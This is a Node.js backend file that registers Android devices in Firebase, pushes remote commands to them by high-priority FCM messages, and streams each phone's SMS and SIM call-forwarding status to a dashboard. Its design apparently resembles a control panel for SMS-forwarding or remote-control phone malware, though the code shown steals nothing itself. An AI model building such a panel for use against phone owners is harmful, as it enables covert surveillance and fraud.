// ===============================================
//  SERVER.JS — FINAL MASTER VERSION (SMS + SIM LIVE)
// ===============================================

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import adminRoutes from "./routes/adminRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

// ---------------------------------------------------
const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

// ---------------------------------------------------
/* SOCKET.IO */
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

// Utility
const clean = (id) => id?.toString()?.trim()?.toUpperCase();

// ======================================================
//       🟢 FCM PUSHER
// ======================================================
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    console.log("⚠️ Missing FCM Token");
    return;
  }

  try {
    const msg = {
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    };

    const res = await fcm.send(msg);
    console.log("📨 FCM SENT:", type, res);
  } catch (err) {
    console.error("❌ FCM ERROR:", err.message);
  }
}

// ======================================================
//       🟢 BUILD DEVICES LIST
// ======================================================
async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  return Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};

    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });
}

// ======================================================
//       🟢 PUSH FULL DEVICES LIST TO DASHBOARD
// ======================================================
async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();
    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });

    console.log(`📡 devicesLive pushed (${reason}) → ${devices.length}`);
  } catch (err) {
    console.error("❌ refreshDevicesLive ERROR:", err.message);
  }
}

// ======================================================
//         🟢 SOCKET.IO CONNECTION
// ======================================================
io.on("connection", async (socket) => {
  console.log("🔗 Client Connected:", socket.id);

  let currentDeviceId = null;

  // Send initial device list
  try {
    const initialDevices =
      lastDevicesList?.length ? lastDevicesList : await buildDevicesList();

    socket.emit("devicesLive", {
      success: true,
      count: initialDevices.length,
      data: initialDevices,
    });

    console.log(`📡 initial devicesLive → ${initialDevices.length} sent`);
  } catch (err) {
    socket.emit("devicesLive", { success: false, data: [] });
  }

  // Device registers via socket
  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", { id, connectivity: "Online" });

    refreshDevicesLive(`deviceOnline:${id}`);
  });

  // Disconnect
  socket.on("disconnect", async () => {
    console.log("🔌 Disconnect:", socket.id);
    if (currentDeviceId) {
      await rtdb.ref(`status/${currentDeviceId}`).set({
        connectivity: "Offline",
        lastSeen: Date.now(),
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: currentDeviceId,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
    }
  });
});

// ======================================================
//       🟢 LIVE: BROS REPLY (checkOnline/{uid})
// ======================================================
const brosWatchers = new Map();

function stopBrosWatcher(uid) {
  if (brosWatchers.has(uid)) {
    brosWatchers.get(uid).off();
    brosWatchers.delete(uid);
  }
}

function startBrosWatcher(uid) {
  const ref = rtdb.ref(`checkOnline/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("brosReplyUpdate", {
        uid,
        success: true,
        data: null,
      });
      return;
    }
    const data = snap.val();

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data: { uid, ...data },
    });
  });

  brosWatchers.set(uid, ref);
}

// API
app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    stopBrosWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    startBrosWatcher(uid);

    res.json({
      success: true,
      data,
      message: "Live listening started",
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

// ======================================================
//       🟢 LIVE: SMS STATUS (commandCenter/smsStatus/{uid})
// ======================================================
const smsWatchers = new Map();

function stopSmsWatcher(uid) {
  if (smsWatchers.has(uid)) {
    smsWatchers.get(uid).off();
    smsWatchers.delete(uid);
  }
}

function startSmsWatcher(uid) {
  const ref = rtdb.ref(`commandCenter/smsStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("smsStatusUpdate", { uid, success: true, data: [] });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([smsId, obj]) =>
      list.push({ smsId, uid, ...obj })
    );

    list.sort((a, b) => b.at - a.at);

    io.emit("smsStatusUpdate", { uid, success: true, data: list });
  });

  smsWatchers.set(uid, ref);
}

// API
app.get("/api/device/:uid/sms-status", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    stopSmsWatcher(uid);

    const snap = await rtdb.ref(`commandCenter/smsStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([smsId, obj]) =>
        list.push({ smsId, uid, ...obj })
      );
      list.sort((a, b) => b.at - a.at);
    }

    startSmsWatcher(uid);

    res.json({
      success: true,
      data: list,
      message: "Live SMS status listening started",
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

// ======================================================
//       🟢 LIVE: SIM FORWARD (simForwardStatus/{uid})
// ======================================================
const simWatchers = new Map();

function stopSimWatcher(uid) {
  if (simWatchers.has(uid)) {
    simWatchers.get(uid).off();
    simWatchers.delete(uid);
  }
}

function startSimWatcher(uid) {
  const ref = rtdb.ref(`simForwardStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("simForwardUpdate", { uid, success: true, data: [] });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([slot, obj]) =>
      list.push({ simSlot: Number(slot), ...obj })
    );

    list.sort((a, b) => b.updatedAt - a.updatedAt);

    io.emit("simForwardUpdate", { uid, success: true, data: list });
  });

  simWatchers.set(uid, ref);
}

// API
app.get("/api/device/:uid/sim-forward", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    stopSimWatcher(uid);

    const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([slot, obj]) =>
        list.push({ simSlot: Number(slot), ...obj })
      );
      list.sort((a, b) => b.updatedAt - a.updatedAt);
    }

    startSimWatcher(uid);

    res.json({
      success: true,
      data: list,
      message: "Live SIM forward listening started",
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

// ======================================================
//     ADMIN BROADCAST
// ======================================================
rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) return;

  const adminData = snap.val();
  console.log("🛠 Admin updated:", adminData);

  const all = await rtdb.ref("registeredDevices").get();
  if (!all.exists()) return;

  all.forEach((child) => {
    const token = child.val()?.fcmToken;

    if (token) {
      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId: child.key,
        ...adminData,
      });
    }
  });
});

// ======================================================
//     DEVICE COMMAND CENTER
// ======================================================
function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const cmd = extractCommandData(snap.val());
  if (!cmd) return;

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandChange);
rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);

// ======================================================
//    CHECK ONLINE (RESET CLOCK)
// ======================================================
async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const data = snap.val();

  const now = Date.now();

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  io.emit("deviceStatus", {
    id: uid,
    connectivity: "Online",
    lastSeen: now,
  });

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;

  if (token) {
    sendFcmHighPriority(token, "CHECK_ONLINE", {
      uniqueid: uid,
      available: data.available || "unknown",
      checkedAt: String(data.checkedAt || ""),
    });
  }
}

rtdb.ref("checkOnline").on("child_added", handleCheckOnlineChange);
rtdb.ref("checkOnline").on("child_changed", handleCheckOnlineChange);

// ======================================================
//      ROUTES & INITIAL REFRESH
// ======================================================
refreshDevicesLive("initial");

app.use(adminRoutes);
app.use(notificationRoutes);
app.use("/api", checkRoutes);
app.use(commandRoutes);

app.get("/", (_, res) => {
  res.send("RTDB + Socket.IO Backend Running ❤️");
});

// ======================================================
server.listen(PORT, () => {
  console.log(`🚀 Server running on PORT ${PORT}`);
});
